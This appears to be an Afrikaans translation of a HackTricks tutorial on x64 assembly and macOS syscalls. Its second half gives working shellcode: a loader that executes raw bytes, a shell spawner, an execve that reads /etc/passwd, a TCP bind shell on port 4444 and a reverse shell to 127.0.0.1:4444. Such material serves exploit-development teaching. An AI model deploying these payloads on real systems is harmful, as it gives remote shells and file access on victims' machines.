# Inleiding tot x64

{{#include ../../../banners/hacktricks-training.md}}

## **Inleiding tot x64**

x64, ook bekend as x86-64, is 'n 64-bis verwerker argitektuur wat hoofsaaklik in desktop en bediener rekenaars gebruik word. Dit het ontstaan uit die x86 argitektuur wat deur Intel vervaardig is en later deur AMD met die naam AMD64 aangeneem is, en dit is die heersende argitektuur in persoonlike rekenaars en bedieners vandag.

### **Registers**

x64 brei op die x86 argitektuur uit, met **16 algemene registers** gemerk as `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi`, en `r8` tot `r15`. Elke een van hierdie kan 'n **64-bis** (8-byte) waarde stoor. Hierdie registers het ook 32-bis, 16-bis, en 8-bis sub-registers vir kompatibiliteit en spesifieke take.

1. **`rax`** - Tradisioneel gebruik vir **terugkeerwaardes** van funksies.
2. **`rbx`** - Gereeld gebruik as 'n **basisregister** vir geheue operasies.
3. **`rcx`** - Gewoonlik gebruik vir **lus tellers**.
4. **`rdx`** - Gebruik in verskeie rolle insluitend uitgebreide aritmetiese operasies.
5. **`rbp`** - **Basisaanwyser** vir die stapelraam.
6. **`rsp`** - **Stapelaanwyser**, wat die bokant van die stapel dop hou.
7. **`rsi`** en **`rdi`** - Gebruik vir **bron** en **bestemming** indekse in string/geheue operasies.
8. **`r8`** tot **`r15`** - Bykomende algemene registers wat in x64 bekendgestel is.

### **Aanroep Konvensie**

Die x64 aanroep konvensie verskil tussen bedryfstelsels. Byvoorbeeld:

- **Windows**: Die eerste **vier parameters** word in die registers **`rcx`**, **`rdx`**, **`r8`**, en **`r9`** oorgedra. Verdere parameters word op die stapel geplaas. Die terugkeerwaarde is in **`rax`**.
- **System V (gewoonlik gebruik in UNIX-agtige stelsels)**: Die eerste **ses heelgetal of aanwyser parameters** word in registers **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`**, en **`r9`** oorgedra. Die terugkeerwaarde is ook in **`rax`**.

As die funksie meer as ses invoere het, sal die **oorige op die stapel oorgedra word**. **RSP**, die stapelaanwyser, moet **16 bytes uitgelijnd** wees, wat beteken dat die adres waarheen dit wys, deelbaar moet wees deur 16 voordat enige aanroep plaasvind. Dit beteken dat ons normaalweg moet verseker dat RSP behoorlik uitgelijnd is in ons shellcode voordat ons 'n funksie aanroep. In praktyk werk stelselaanroepe egter baie keer selfs al word hierdie vereiste nie nagekom nie.

### Aanroep Konvensie in Swift

Swift het sy eie **aanroep konvensie** wat gevind kan word in [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)

### **Algemene Instruksies**

x64 instruksies het 'n ryk stel, wat kompatibiliteit met vroeëre x86 instruksies handhaaf en nuwe bekendstel.

- **`mov`**: **Beweeg** 'n waarde van een **register** of **geheue ligging** na 'n ander.
- Voorbeeld: `mov rax, rbx` — Beweeg die waarde van `rbx` na `rax`.
- **`push`** en **`pop`**: Druk of pop waardes na/vanaf die **stapel**.
- Voorbeeld: `push rax` — Druk die waarde in `rax` op die stapel.
- Voorbeeld: `pop rax` — Pop die boonste waarde van die stapel in `rax`.
- **`add`** en **`sub`**: **Optelling** en **aftrekking** operasies.
- Voorbeeld: `add rax, rcx` — Voeg die waardes in `rax` en `rcx` by en stoor die resultaat in `rax`.
- **`mul`** en **`div`**: **Vermenigvuldiging** en **deling** operasies. Let op: hierdie het spesifieke gedrag rakende operand gebruik.
- **`call`** en **`ret`**: Gebruik om **aan te roep** en **terug te keer van funksies**.
- **`int`**: Gebruik om 'n sagteware **onderbreking** te aktiveer. Byvoorbeeld, `int 0x80` is gebruik vir stelselaanroepe in 32-bis x86 Linux.
- **`cmp`**: **Vergelyk** twee waardes en stel die CPU se vlae op grond van die resultaat.
- Voorbeeld: `cmp rax, rdx` — Vergelyk `rax` met `rdx`.
- **`je`, `jne`, `jl`, `jge`, ...**: **Voorwaardelike sprong** instruksies wat die beheerstroom verander op grond van die resultate van 'n vorige `cmp` of toets.
- Voorbeeld: Na 'n `cmp rax, rdx` instruksie, `je label` — Spring na `label` as `rax` gelyk is aan `rdx`.
- **`syscall`**: Gebruik vir **stelselaanroepe** in sommige x64 stelsels (soos moderne Unix).
- **`sysenter`**: 'n Geoptimaliseerde **stelselaanroep** instruksie op sommige platforms.

### **Funksie Proloog**

1. **Druk die ou basisaanwyser**: `push rbp` (stoor die oproeper se basisaanwyser)
2. **Beweeg die huidige stapelaanwyser na die basisaanwyser**: `mov rbp, rsp` (stel die nuwe basisaanwyser op vir die huidige funksie)
3. **Toekenning van ruimte op die stapel vir plaaslike veranderlikes**: `sub rsp, <size>` (waar `<size>` die aantal bytes is wat benodig word)

### **Funksie Epiloog**

1. **Beweeg die huidige basisaanwyser na die stapelaanwyser**: `mov rsp, rbp` (deallocate plaaslike veranderlikes)
2. **Pop die ou basisaanwyser van die stapel af**: `pop rbp` (herstel die oproeper se basisaanwyser)
3. **Terugkeer**: `ret` (gee beheer terug aan die oproeper)

## macOS

### syscalls

Daar is verskillende klasse van syscalls, jy kan [**dit hier vind**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall_sw.h)**:**
```c
#define SYSCALL_CLASS_NONE	0	/* Invalid */
#define SYSCALL_CLASS_MACH	1	/* Mach */
#define SYSCALL_CLASS_UNIX	2	/* Unix/BSD */
#define SYSCALL_CLASS_MDEP	3	/* Machine-dependent */
#define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
#define SYSCALL_CLASS_IPC	5	/* Mach IPC */
```
Dan kan jy elke syscall nommer [**in hierdie URL**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**
```c
0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
1	AUE_EXIT	ALL	{ void exit(int rval); }
2	AUE_FORK	ALL	{ int fork(void); }
3	AUE_NULL	ALL	{ user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); }
4	AUE_NULL	ALL	{ user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }
5	AUE_OPEN_RWTC	ALL	{ int open(user_addr_t path, int flags, int mode); }
6	AUE_CLOSE	ALL	{ int close(int fd); }
7	AUE_WAIT4	ALL	{ int wait4(int pid, user_addr_t status, int options, user_addr_t rusage); }
8	AUE_NULL	ALL	{ int nosys(void); }   { old creat }
9	AUE_LINK	ALL	{ int link(user_addr_t path, user_addr_t link); }
10	AUE_UNLINK	ALL	{ int unlink(user_addr_t path); }
11	AUE_NULL	ALL	{ int nosys(void); }   { old execv }
12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
[...]
```
So om die `open` syscall (**5**) van die **Unix/BSD klas** aan te roep, moet jy dit byvoeg: `0x2000000`

So, die syscall nommer om open aan te roep, sal `0x2000005` wees

### Shellcodes

Om te kompileer:
```bash
nasm -f macho64 shell.asm -o shell.o
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```
Om die bytes te onttrek:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done

# Another option
otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
```
<details>

<summary>C kode om die shellcode te toets</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Geneem uit [**hier**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) en verduidelik. 

{{#tabs}}
{{#tab name="with adr"}}
```armasm
bits 64
global _main
_main:
call    r_cmd64
db '/bin/zsh', 0
r_cmd64:                      ; the call placed a pointer to db (argv[2])
pop     rdi               ; arg1 from the stack placed by the call to l_cmd64
xor     rdx, rdx          ; store null arg3
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}

{{#tab name="met stap"}}
```armasm
bits 64
global _main

_main:
xor     rdx, rdx          ; zero our RDX
push    rdx               ; push NULL string terminator
mov     rbx, '/bin/zsh'   ; move the path into RBX
push    rbx               ; push the path, to the stack
mov     rdi, rsp          ; store the stack pointer in RDI (arg1)
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}
{{#endtabs}}

#### Lees met cat

Die doel is om `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` uit te voer, so die tweede argument (x1) is 'n array van parameters (wat in geheue 'n stapel van die adresse beteken).
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48`

lea rdi, [rel cat_path]   ; rdi will hold the address of "/bin/cat"
lea rsi, [rel passwd_path] ; rsi will hold the address of "/etc/passwd"

; Create inside the stack the array of args: ["/bin/cat", "/etc/passwd"]
push rsi   ; Add "/etc/passwd" to the stack (arg0)
push rdi   ; Add "/bin/cat" to the stack (arg1)

; Set in the 2nd argument of exec the addr of the array
mov rsi, rsp    ; argv=rsp - store RSP's value in RSI

xor rdx, rdx    ; Clear rdx to hold NULL (no environment variables)

push    59      ; put 59 on the stack (execve syscall)
pop     rax     ; pop it to RAX
bts     rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall         ; Make the syscall

section .data
cat_path:      db "/bin/cat", 0
passwd_path:   db "/etc/passwd", 0
```
#### Roep opdrag met sh
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 32           ; Create space on the stack

; Argument array
lea rdi, [rel touch_command]
push rdi                      ; push &"touch /tmp/lalala"
lea rdi, [rel sh_c_option]
push rdi                      ; push &"-c"
lea rdi, [rel sh_path]
push rdi                      ; push &"/bin/sh"

; execve syscall
mov rsi, rsp                  ; rsi = pointer to argument array
xor rdx, rdx                  ; rdx = NULL (no env variables)
push    59                    ; put 59 on the stack (execve syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

_exit:
xor rdi, rdi                  ; Exit status code 0
push    1                     ; put 1 on the stack (exit syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

section .data
sh_path:        db "/bin/sh", 0
sh_c_option:    db "-c", 0
touch_command:  db "touch /tmp/lalala", 0
```
#### Bind shell

Bind shell van [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) in **poort 4444**
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xffffffffa3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; bind(host_sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x68
syscall

; listen(host_sockid, 2)
xor  rsi, rsi
mov  sil, 0x2
mov  rax, r8
mov  al, 0x6a
syscall

; accept(host_sockid, 0, 0)
xor  rsi, rsi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x1e
syscall

mov rdi, rax
mov sil, 0x3

dup2:
; dup2(client_sockid, 2)
;   -> dup2(client_sockid, 1)
;   -> dup2(client_sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
mov  rax, r8
mov  al, 0x3b
syscall
```
#### Reverse Shell

Reverse shell van [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html). Reverse shell na **127.0.0.1:4444**
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xfeffff80a3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; connect(sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x62
syscall

xor rsi, rsi
mov sil, 0x3

dup2:
; dup2(sockid, 2)
;   -> dup2(sockid, 1)
;   -> dup2(sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x3b
syscall
```
{{#include ../../../banners/hacktricks-training.md}}
